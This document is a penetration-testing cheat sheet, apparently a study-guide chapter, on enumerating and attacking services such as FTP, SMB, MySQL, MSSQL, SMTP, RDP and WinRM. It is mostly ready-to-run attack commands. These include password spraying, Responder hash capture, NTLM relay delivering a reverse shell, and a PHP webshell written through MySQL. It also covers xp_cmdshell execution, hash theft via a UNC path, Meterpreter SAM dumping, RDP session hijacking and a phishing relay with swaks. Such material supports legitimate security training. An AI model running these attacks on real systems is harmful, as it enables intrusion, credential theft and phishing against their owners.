# 04 — Service Enumeration

**Jump to:** [FTP (21)](#ftp-21) · [SMB (137-139, 445)](#smb-137-139-445) · [NFS (111, 2049)](#nfs-111-2049) · [DNS (53)](#dns-53) · [Mail (SMTP / POP3 / IMAP)](#mail-smtp--pop3--imap) · [SNMP (161/162 UDP)](#snmp-161162-udp) · [MySQL (3306)](#mysql-3306) · [MSSQL (1433)](#mssql-1433) · [TNS — Oracle (1521)](#tns--oracle-1521) · [IPMI (623 UDP)](#ipmi-623-udp) · [SSH (22)](#ssh-22) · [Rsync (873)](#rsync-873) · [R-services (512/513/514)](#r-services-512513514) · [RDP (3389)](#rdp-3389) · [WinRM (5985/5986)](#winrm-59855986) · [WMI (135)](#wmi-135) · [Server-Profile Cheats](#server-profile-cheats)

Per-service playbooks for every common port Nmap is likely to find. Each block follows the same shape: where the config lives, dangerous settings to look for, and the tools / commands to interact with it.

---

### FTP (21)

```bash
ftp anonymous@<ip>              # try anonymous first
ftp user@<ip>                   # or named user
nc -nv <ip> 21                  # raw banner
telnet <ip> 21                  # alternative banner check
openssl s_client -connect <ip>:21 -starttls ftp   # if TLS/SSL wrapped
wget -m --no-passive ftp://anonymous:anonymous@<ip>   # mirror all files
```

Inside the `ftp>` prompt:

```bash
ftp> passive                    # passive mode (firewalled networks)
```

#### Spray Without Lockout

```bash
medusa -U users.list -P passwords.list -h <ip> -M ftp -t 100 -f
```

#### Bounce Attack

Tricks an external FTP server into proxying TCP into an internal target:

```bash
nmap -Pn -v -n -p80 -b anonymous:password@<external_ftp> <internal_victim>
```

#### CVE-2022-22836 (CoreFTP < build 727)

Upload arbitrary files via authenticated path traversal:

```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> \
    --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Reference: <https://nvd.nist.gov/vuln/detail/CVE-2022-22836>

vsFTPd config (`/etc/vsftpd.conf`) — danger flags:

| Setting | Why it matters |
|---------|----------------|
| `anonymous_enable=YES` | Anonymous login |
| `anon_upload_enable=YES` | Anonymous can upload |
| `anon_mkdir_write_enable=YES` | Anonymous can create dirs |
| `no_anon_password=YES` | No anon password prompt |
| `anon_root=/path` | Where anon lands |
| `write_enable=YES` | STOR/DELE/RNFR/RNTO/MKD/RMD/APPE/SITE allowed |
| `chown_uploads=YES` + `chown_username=user` | Uploaded files re-owned |
| `chroot_local_user=YES` | Local users chrooted to home |
| `ls_recurse_enable=YES` | Recursive listings allowed |

Blacklist file: `/etc/ftpusers`.

### SMB (137-139, 445)

Config: `/etc/samba/smb.conf` — danger flags:

| Setting | Why |
|---------|-----|
| `browseable = yes` | Shares listed |
| `read only = no` / `writable = yes` | Writeable shares |
| `guest ok = yes` | No password needed |
| `enable privileges = yes` | Honors SID privs |
| `create mask = 0777` / `directory mask = 0777` | World-writeable files/dirs |
| `logon script = script.sh` | Runs on logon |
| `magic script = script.sh` | Runs when closed |

```bash
## Listing & null sessions
smbclient -L //<ip> -N                              # list shares (null)
smbmap -H <ip>                                       # recon shares
nmap -p445 --script smb-enum-shares <ip>

## Connect
smbclient //<ip>/<share> -N                          # anonymous
smbclient //<ip>/<share> -U 'user%pass'              # creds
smbclient //<ip>/<share> -W <DOMAIN> -U 'user%pass'  # domain-joined

## Mount
sudo mount -t cifs //<ip>/<share> /mnt/smb -o user=<user>
```

#### rpcclient (null sessions)

```bash
rpcclient -U "" <dc-ip> -N
## Once in:
srvinfo
enumdomains
querydominfo
netshareenumall
netsharegetinfo <share>
enumdomusers
queryuser <RID>

## Build users.txt from null session
rpcclient -U "" -N <dc-ip> -c "enumdomusers" \
  | awk -F'[][]' '{print $2}' | cut -d' ' -f1 > users.txt

## If enumdomusers blocked, brute-force RIDs
for i in $(seq 500 2000); do
  echo "queryuser $i" | rpcclient -U "" -N <dc-ip> 2>/dev/null | grep -i "User Name"
done
```

#### netexec (formerly crackmapexec) — SMB

```bash
nxc smb <ip> -u '' -p '' --pass-pol                  # password policy
nxc smb <ip> -u 'user' -p 'pass' --shares            # share perms
nxc smb <ip> -u '' -p '' --rid-brute                 # dump RIDs/users

## Generate users.txt from RID brute
nxc smb <ip> -u <user> -p <pass> --rid-brute \
  | grep 'SidTypeUser' | cut -d '\' -f2 | cut -d '(' -f1 > users.txt

## Test "username == password" before spraying
nxc smb <ip> -d <DOMAIN> -u usernames.txt -p usernames.txt --no-brute --continue-on-success
```

If you land valid creds, kerberoast SPNs immediately:

```bash
impacket-GetUserSPNs <DOMAIN>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile hashes.txt
```

#### enum4linux-ng (SMB + LDAP one-shot)

```bash
enum4linux-ng -A -u 'user' -p 'pass' <ip>
```

#### Browse a Share From Windows RDP

```bash
Win + R   →   \\<smb_ip>\Finance
```

#### Spray + Responder + NTLM Relay

```bash
## Password spray
nxc smb <ip> -u jason -p passwords.list

## Responder — capture NetNTLMv2 from coerced auth
responder -I <interface>
## Captures land in /usr/share/responder/logs/
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If the hash won't crack, relay it instead:

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <target-ip>

## Same, with a delivered reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t <target-ip> -c '<rev_shell>'

## Catch the shell
nc -lvnp 9001
```

#### CVE — SMBGhost (CVE-2020-0796)

Integer overflow in SMBv3.1.1 compression — affects Windows 10 1903 / 1909. Reference: <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796>

### NFS (111, 2049)

Config: `/etc/exports`.

```bash
showmount -e <ip>                                    # available shares
mkdir target-NFS
sudo mount -t nfs <ip>:/ ./target-NFS/ -o nolock
```

⚠ Check `no_root_squash` in `/etc/exports` — see [Linux Privesc → NFS root squashing](../4-post-exploitation/01-linux-privilege-escalation.md).

### DNS (53)

See [DNS Reconnaissance](./02-dns-recon.md).

```bash
dig ns <domain> @<dc-ip>
dig CH TXT version.bind <ip>
dig any <domain> @<dc-ip>
dig axfr <domain> @<dc-ip>                           # zone transfer
```

Server settings worth flagging: `allow-query`, `allow-recursion`, `allow-transfer`.

### Mail (SMTP / POP3 / IMAP)

| Port | Service | Notes |
|------|---------|-------|
| TCP/25 | SMTP | Unencrypted |
| TCP/110 | POP3 | Unencrypted |
| TCP/143 | IMAP4 | Unencrypted |
| TCP/465 | SMTP | Encrypted (SMTPS) |
| TCP/587 | SMTP | Encrypted / STARTTLS |
| TCP/993 | IMAP4 | Encrypted |
| TCP/995 | POP3 | Encrypted |

#### SMTP (25)

```bash
sudo nmap <ip> -p25 --script smtp-open-relay -v

## Metasploit user enumeration
## search smtp_enum → use 0 → set RHOSTS <ip> → set USER_FILE <wordlist> → run
```

User enumeration via raw telnet:

```bash
telnet <ip> 25
VRFY <username>
```

`smtp-user-enum` (faster, scriptable):

```bash
smtp-user-enum -M <mode> -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
## modes:
##   VRFY — check usernames
##   RCPT — check recipients
```

Open-relay test + phishing relay with `swaks`:

```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Please complete: http://mycustomphishinglink.com/' \
      --server 10.10.11.213
```

Password spray:

```bash
medusa -h 10.129.203.12 -u 'marlin@inlanefreight.htb' \
    -P /usr/share/wordlists/rockyou.txt -t 10 -M smtp -f
```

CVE: **OpenSMTPD 6.6.2 and older** — pre-auth RCE.

#### POP3 (110/995)

```bash
openssl s_client -connect <ip>:pop3s                 # POP3 over TLS
```

User enumeration via raw telnet:

```bash
telnet <ip> 110
USER <user>
```

Password attack with Metasploit:

```bash
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS 10.10.10.1
set USER_FILE users.txt
set PASS_FILE /dev/null
run
```

#### IMAP (143/993)

```bash
openssl s_client -connect <ip>:imaps                 # IMAP over TLS
```

IMAP command form: `a<n> <command>` (where `<n>` increments per command).

| IMAP | POP3 |
|------|------|
| `LOGIN user pass` | `USER user` / `PASS pass` |
| `LIST "" *` | `STAT` |
| `SELECT INBOX` | `LIST` |
| `FETCH <id> all` | `RETR <id>` |
| `FETCH <id> BODY[TEXT]` | — |
| `CLOSE` | `DELE <id>` |
| `LOGOUT` | `QUIT` |

Dangerous Dovecot settings: `auth_debug`, `auth_debug_passwords`, `auth_verbose`, `auth_verbose_passwords`, `auth_anonymous_username`.

#### Cloud Mail — Office 365 (o365spray)

- Repo: <https://github.com/0xZDH/o365spray>

```bash
## Validate the domain exists
python3 o365spray.py --validate --domain msplaintext.xyz

## Enumerate usernames
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

## Password spray
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' \
    --count 1 --lockout 1 --domain msplaintext.xyz
```

Medusa alternative:

```bash
medusa -h outlook.office365.com -U users.txt -P passwords.txt -M o365 -t 10 -f
```

### SNMP (161/162 UDP)

```bash
sudo nmap -sU --top-ports 100 <ip>
snmpwalk -v2c -c public <ip>
snmpwalk -v2c -c public <ip> | grep 'STRING:*'        # the useful filter
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <ip>   # brute community strings
braa <community>@<ip>:.1.3.6.*                        # brute OIDs
```

Dangerous settings in `snmpd.conf`:

| Setting | Why |
|---------|-----|
| `rwuser noauth` | Read/write to full OID tree, no auth |
| `rwcommunity <str> <ipv4>` | Same, but by community string |
| `rwcommunity6 <str> <ipv6>` | Same over IPv6 |

### MySQL (3306)

```bash
sudo nmap <ip> -sV -sC -p3306 --script mysql*
mysql -u <user> -p<pass> -h <ip>           # no space after -p
mysql -u julio -pPassword123 -h 10.129.20.13

## Inside MySQL
show databases;
use <db>;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <col> = "<string>";
```

Default databases (skip past these when hunting for app data):

| Database | Purpose |
|----------|---------|
| `mysql` | System DB — server metadata |
| `information_schema` | Database metadata access |
| `performance_schema` | Low-level execution monitoring |
| `sys` | Helper views over `performance_schema` |

#### Misconfigs Worth Checking

- Anonymous auth allowed
- Users without passwords
- Loose permissions on system tables

#### CVE — MySQL 5.6.x Auth Bypass

Repeatedly sending an incorrect password against vulnerable 5.6.x builds can authenticate. Reference: <https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass>

#### Write a Local File (e.g. drop a webshell)

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>"
    INTO OUTFILE '/var/www/html/webshell.php';
```

Effected by `secure_file_priv`:

```sql
show variables like "secure_file_priv";
```

- **Empty** → no effect (insecure)
- **Path** → server limits import/export to that directory (must already exist)
- **NULL** → import/export disabled

#### Read a Local File

```sql
SELECT LOAD_FILE("/etc/passwd");
```

Dangerous my.cnf settings: `user`, `password`, `admin_address`, `debug`, `sql_warnings`, `secure_file_priv`.

### MSSQL (1433)

```bash
## Auth modes
impacket-mssqlclient user:pass@<ip>
impacket-mssqlclient -windows-auth DOM/user:pass@<ip>
impacket-mssqlclient -hashes [LM:]NT DOM/user@<ip>
impacket-mssqlclient -p 1433 julio@10.129.203.7 -windows-auth

## sqsh (interactive cmd for SQL)
sqsh -S <ip> -U <user> -P 'Password!' -h
sqsh -S 10.129.20.13 -U username -P Password123

## 95% script coverage
sudo nmap --script ms-sql-* \
  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
  -sV -p 1433 <ip>
```

Default databases:

| Database | Purpose |
|----------|---------|
| `master` | Instance-level information |
| `msdb` | SQL Server Agent |
| `model` | Template database copied for every new DB |
| `resource` | Read-only DB of system objects (sys schema) |
| `tempdb` | Temporary objects |

#### xp_cmdshell

- Powerful, **disabled by default**.
- Enable via Policy-Based Management or `sp_configure`.
- Spawned process runs as the SQL Server service account.
- Operates synchronously — control returns only when the command finishes.

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXEC xp_cmdshell 'whoami';
```

If the SQL service account holds `SeImpersonate`, this is a free path to SYSTEM via Potato attacks — see [Windows Privesc → SeImpersonate](../4-post-exploitation/02-windows-privilege-escalation.md).

#### PowerUpSQL (from a domain-joined Windows host)

```bash
Import-Module .\PowerUpSQL.ps1

## Find every SQL instance in the domain
Get-SQLInstanceDomain

## Run a query against a specific instance with windows auth
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" `
    -username "inlanefreight\damundsen" -password "SQL1234!" \
    -query 'Select @@version'
```

#### MSSQL via Impacket → Windows shell (Kali to Windows)

```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami /priv
```

#### MSSQL via Metasploit → Meterpreter + kiwi

```bash
use exploit/windows/mssql/mssql_payload
## set RHOSTS / RPORT / CMSHELL options / USERNAME / PASSWORD
run

## In meterpreter, try to escalate then load kiwi (mimikatz):
getsystem
load kiwi
lsa_dump_sam
```

#### Read Files

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
```

#### Linked Servers

```sql
SELECT srvname, isremote FROM sysservers;
```

Steal a hash via UNC path (Responder on Kali catches it):

```bash
sudo responder -I tun0
```

```sql
EXEC master..xp_dirtree '\\<kali_ip>\share\';
```

```bash
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Inside impacket-mssqlclient — accounts often have higher privs *on linked servers* than locally:

```sql
enum_links
use_link [link_name]
enable_xp_cmdshell
EXEC xp_cmdshell 'whoami';
```

#### Impersonation

See who you can impersonate:

```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

Check current user and role:

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
```

Impersonate:

```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
```

> Always check impersonation rights *and* linked-server rights for SQL — different linked servers may grant different rights to the same login.

Dangerous settings: unencrypted client connections, self-signed certs, named-pipes auth, weak/default `sa` creds.

### TNS — Oracle (1521)

```bash
sudo nmap -p1521 -sV <ip> --open
sudo nmap -p1521 -sV <ip> --open --script oracle-sid-brute
./odat.py all -s <ip>                                # easy-pass / SID enum
```

#### sqlplus

```bash
## Install on Parrot/Kali
sudo apt update && sudo apt upgrade parrot-core
sudo apt install oracle-instantclient-sqlplus
## if libsqlplus missing:
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig

sqlplus -v
sqlplus scott/tiger@<ip>/XE
sqlplus scott/tiger@<ip>/XE as <other_account>       # if delegation rights
```

Inside sqlplus:

```sql
select * from user_role_privs;
select name, password from sys.user$;   -- if logged in as sysdba
```

If Oracle is fronting a web app, upload via UTL_FILE:

```bash
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <ip> -d XE -U scott -P tiger --sysdba \
    --putFile 'C:\inetpub\wwwroot' testing.txt ./testing.txt
curl http://<ip>/testing.txt
```

### IPMI (623 UDP)

```bash
sudo nmap -sU --script ipmi-version -p 623 <ip>

## Dump and crack with Metasploit
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <ip>
run

hashcat -m 7300 hash.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

### SSH (22)

```bash
nmap -sC -sV -p22 <ip>
ssh -v user@<ip>                                # show offered auth methods
ssh -v user@<ip> -o PreferredAuthentications=password
```

#### Brute Force

```bash
medusa -h <ip> -U users.txt -P /usr/share/wordlists/rockyou.txt -M ssh -f
```

Dangerous `sshd_config` flags:

| Setting | Why |
|---------|-----|
| `PasswordAuthentication yes` | Allows password auth (sprayable) |
| `PermitEmptyPasswords yes` | Empty passwords accepted |
| `PermitRootLogin yes` | Direct root login |
| `Protocol 1` | Outdated crypto |
| `X11Forwarding yes` | X11 forwarding |
| `AllowTcpForwarding yes` | TCP forwarding |
| `PermitTunnel` | Layer-3 tunneling allowed |

Don't forget to read `/etc/passwd` for service accounts (mysql, etc.) you can target.

### Rsync (873)

```bash
sudo nmap -sV -p873 <ip>
nc -nv <ip> 873                                # banner
rsync -av --list-only rsync://<ip>/<share>
```

### R-services (512/513/514)

```bash
sudo nmap -sV -p 512,513,514 <ip>
rlogin <ip> -l htb-student
rwho
rusers -al <ip>
```

### RDP (3389)

```bash
nmap -sV -sC -p3389 --script rdp* <ip>

## Security check
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
./rdp-sec-check.pl <ip>

## Clients
xfreerdp /u:<user> /p:'<pass>' /v:<ip>
rdesktop -u <user> -p - <ip>
remmina -c rdp://<user>@<ip>
remmina -c rdp://<DOMAIN>\\<user>@<ip>
```

#### Session Hijack (Windows Server 2018 and older)

If multiple users have RDP sessions on the host, you can hop into another session as SYSTEM:

```bash
query user                              # find the session you want
sc.exe create sessionhijack \
    binpath= "cmd.exe /k tscon 2 /dest:<session name>"
```

#### Restricted Admin Mode (PtH-over-RDP)

If RDP-as-admin keeps failing with valid creds, Restricted Admin is likely enabled:

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD \
    /v DisableRestrictedAdmin /d 0x0 /f
```

#### CVE — BlueKeep (CVE-2019-0708)

Pre-auth RCE on RDP for older Windows builds. Public PoCs frequently BSOD the target — use very cautiously, never in production engagements without explicit approval.

### WinRM (5985/5986)

```bash
nmap -sV -sC -p5985,5986 --disable-arp-ping -n <ip>
evil-winrm -i <ip> -u <user> -p <pass>
evil-winrm -i <ip> -u <user> -H <NTLM>
```

### WMI (135)

```bash
/usr/share/doc/python3-impacket/examples/wmiexec.py user:'pass'@<ip> "hostname"
```

---

### Server-Profile Cheats

| Server type | Expect to see |
|-------------|---------------|
| Mail / management | SSH, POP3, IMAPS, SNMP |
| Windows server | WinRM, RDP, WMI, SMB |
| DNS server | DNS, FTP, SSH |
